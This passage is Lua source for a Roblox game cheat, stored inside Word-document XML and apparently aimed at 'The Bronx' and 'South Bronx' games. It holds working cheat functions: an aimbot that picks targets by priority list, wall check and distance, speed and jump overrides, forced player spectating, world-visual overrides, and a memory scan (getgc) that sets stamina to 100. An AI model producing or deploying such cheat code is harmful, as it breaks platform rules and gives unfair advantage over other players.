      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.Brightness = OldLightingSettings.Brightness</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.FogEnd = OldLightingSettings.FogEnd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.GlobalShadows = OldLightingSettings.GlobalShadows</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.OutdoorAmbient = OldLightingSettings.OutdoorAmbient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if Config.WorldVisuals.AmbientEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Tint.TintColor = Config.WorldVisuals.AmbientColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Tint.TintColor = Color3.new(1,1,1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Config.WorldVisuals.FogColorEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Set_Fog = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Lighting.FogColor = Config.WorldVisuals.FogColor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Set_Fog then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_Fog = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Lighting.FogColor = OldFogColor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if Config.TheBronx.tb3_fov then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Set_Fov = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Camera.FieldOfView = Config.TheBronx.FieldOfViewValue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Set_Fov then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_Fov = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Camera.FieldOfView = 70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end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Stamina_Table = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "South Bronx" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in getgc(true) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if typeof(Value) == "table" and rawget(Value, "Stamina") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stamina_Table = Value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end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Set_Speed, Set_JumpPower, Set_Spectate = false, false, false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService:BindToRenderStep("MiscSettings", 1000 , LPH_NO_VIRTUALIZE(function(Delta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") or not LocalPlayer.Character:FindFirstChild("Head") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (Game_Name == "South Bronx") and not (Game_Name == "Road To Riches") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.MiscSettings.ModifySpeed.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_Speed = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Direction = Vector3.zero</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if UserInputService:IsKeyDown(Enum.KeyCode.W) then Direction += Camera.CFrame.LookVector end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if UserInputService:IsKeyDown(Enum.KeyCode.S) then Direction -= Camera.CFrame.LookVector end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if UserInputService:IsKeyDown(Enum.KeyCode.A) then Direction -= Camera.CFrame.RightVector end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if UserInputService:IsKeyDown(Enum.KeyCode.D) then Direction += Camera.CFrame.RightVector end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Direction.Magnitude &gt; 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:ChangeState(0)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.HumanoidRootPart.CFrame += Direction.Unit * Config.MiscSettings.ModifySpeed.Value * Delta</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.FallingDown then LocalPlayer.Character.Humanoid:ChangeState(2) end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Set_Speed then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Set_Speed = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:ChangeState(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) and 16 or 7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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.MiscSettings.ModifyJump.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_JumpPower = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character:FindFirstChild("Humanoid").JumpHeight = Config.MiscSettings.ModifyJump.Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Set_JumpPower then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Set_JumpPower = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character:FindFirstChild("Humanoid").JumpHeight = 7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Config.TheBronx.PlayerUtilities.SpectatePlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_Spectate = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Subject = Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) and Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character and Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.TheBronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Subject = LocalPlayer.Character.Humanoid</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Camera.CameraSubject = Subject</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Set_Spectate then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_Spectate = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Camera.CameraSubject = LocalPlayer.Character.Humanoid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else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService:BindToRenderStep("MiscSettings", 1000 , LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") or not LocalPlayer.Character:FindFirstChild("Head") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (Game_Name == "South Bronx") and not (Game_Name == "Road To Riches") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.MiscSettings.ModifySpeed.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_Speed = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = Config.MiscSettings.ModifySpeed.Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Set_Speed then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Set_Speed = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character:FindFirstChild("Humanoid").WalkSpeed = 16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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Config.MiscSettings.ModifyJump.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_JumpPower = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = Config.MiscSettings.ModifyJump.Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Set_JumpPower then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Set_JumpPower = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character:FindFirstChild("Humanoid").JumpPower = 50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Config.South_Bronx.PlayerUtilities.SpectatePlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Set_Spectate = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Subject = Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer) and Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character and Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer) or not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character or not Players:FindFirstChild(Config.South_Bronx.PlayerUtilities.SelectedPlayer).Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Subject = LocalPlayer.Character.Humanoid</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Camera.CameraSubject = Subject</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Set_Spectate then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Set_Spectate = true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Camera.CameraSubject = LocalPlayer.Character.Humanoid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Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if LocalPlayer.Character.Head:FindFirstChild("RankTag") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        --if not getgenv().Window then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Head:FindFirstChild("RankTag").MainFrame.NameLabel.Visible = not Config.South_Bronx.LocalPlayer_Config.HideName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Game_Name == "South Bronx" and Solara then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Game_Name == "South Bronx" and Config.South_Bronx.LocalPlayer_Config.InfiniteStamina and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stamina_Table.Stamina = 100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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        WorldToScreenPoint = Camera.WorldToScreenPoint;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetMouseLocation = UserInputService.GetMouseLocation;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FindFirstChild = Workspace.FindFirstChild;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetPlayers = Players.GetPlayers;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetChildren = Workspace.GetChildren;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetPartsObscuringTarget = Camera.GetPartsObscuringTarget;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetDescendants = Workspace.GetDescendants;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        IsA = Workspace.IsA;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FindFirstChildOfClass = Workspace.FindFirstChildOfClass</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        DistanceCheck = LPH_NO_VIRTUALIZE(function(Player, Distance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Player then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Player.Character and FindFirstChild(Player.Character,"HumanoidRootPart") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Magnitude = (Camera.CFrame.Position - FindFirstChild(Player.Character,"HumanoidRootPart").Position).Magnitude;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Distance &gt; Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return false            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        WallCheck = LPH_NO_VIRTUALIZE(function(Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Origin = Camera.CFrame.Position;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Position = FindFirstChild(Character, "Head").Position;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Parameters = RaycastParams.new();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parameters.FilterDescendantsInstances = { LocalPlayer.Character, Camera, Character };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parameters.FilterType = Enum.RaycastFilterType.Blacklist;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parameters.IgnoreWater = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return not Workspace:Raycast(Origin, Position - Origin, Parameters)            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetClosestPlayerToMouseAimbot = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Config.Aimlock.Enabled then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Config.Aimlock.Aiming then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local PriorityPlayers = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Plrs = Players:GetPlayers()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library.priority[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Plrs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value == LocalPlayer then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not table.find(library.priority, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if table.find(library.whitelist, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if (Value.Character and Value.Character:FindFirstChild(Config.Aimlock.TargetPart) and Value.Character:FindFirstChild("Humanoid") and Value.Character:FindFirstChild("Humanoid").Health &gt; (Game_Name == "South Bronx" and 4 or 0)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if FindFirstChildOfClass(Value.Character, "ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if FindFirstChild(Value.Character, "Torso") and FindFirstChild(Value.Character, "Torso").Material == Enum.Material.ForceField then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Value.Character.Parent == nil then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local TargetPart = Value.Character:FindFirstChild(Config.Aimlock.TargetPart)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local MouseLocation = Vector2.new(Mouse.X, Mouse.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local TargetPartPosition, OnScreen = Camera:WorldToScreenPoint(TargetPart.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Radius = Config.Aimlock.UseFieldOfView and Config.Aimlock.Radius or 9e9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Magnitude = (Vector2.new(TargetPartPosition.X,TargetPartPosition.Y) - MouseLocation).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not DistanceCheck(Value, Config.Aimlock.MaxDistance) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Radius &gt; Magnitude and OnScreen and Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if (Config.Aimlock.WallCheck and not WallCheck(Value.Character)) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            table.insert(PriorityPlayers, {Player = Value, Distance = Magnitude})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(PriorityPlayers, function(Player , PlayerTwo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Player.Distance&lt;PlayerTwo.Distance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if PriorityPlayers[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return PriorityPlayers[1].Player</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ValidPlayers = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in Plrs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Value == LocalPlayer then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if table.find(library.whitelist, Value.Name) then continue end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (Value.Character and Value.Character:FindFirstChild(Config.Aimlock.TargetPart) and Value.Character:FindFirstChild("Humanoid") and Value.Character:FindFirstChild("Humanoid").Health &gt; (Game_Name == "South Bronx" and 4 or 0)) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if FindFirstChildOfClass(Value.Character, "ForceField") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if FindFirstChild(Value.Character, "Torso") and FindFirstChild(Value.Character, "Torso").Material == Enum.Material.ForceField then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value.Character.Parent == nil then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local TargetPart = Value.Character:FindFirstChild(Config.Aimlock.TargetPart)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local MouseLocation = Vector2.new(Mouse.X, Mouse.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local TargetPartPosition, OnScreen = Camera:WorldToScreenPoint(TargetPart.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Radius = Config.Aimlock.UseFieldOfView and Config.Aimlock.Radius or 9e9</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Magnitude = (Vector2.new(TargetPartPosition.X,TargetPartPosition.Y) - MouseLocation).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not DistanceCheck(Value, Config.Aimlock.MaxDistance) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Radius &gt; Magnitude and OnScreen and Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if (Config.Aimlock.WallCheck and not WallCheck(Value.Character)) then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(ValidPlayers, {Player = Value, Distance = Magnitude})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end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            table.sort(ValidPlayers, function(Player , PlayerTwo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Player.Distance&lt;PlayerTwo.Distance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if ValidPlayers[1] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return ValidPlayers[1].Player</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        GetClosestPlayerToPlayer = LPH_NO_VIRTUALIZE(function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _Players = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") or not Player.Character:FindFirstChild("Humanoid") then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Index, Value in Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Player == LocalPlayer and Value == LocalPlayer then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Value.Character or not Value.Character:FindFirstChild("HumanoidRootPart") or not Value.Character:FindFirstChild("Humanoid") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Value.Character:FindFirstChild("Humanoid").Health == 0 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if (Player.Character.HumanoidRootPart.Position - Value.Character.HumanoidRootPart.Position).Magnitude &gt; 15 then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
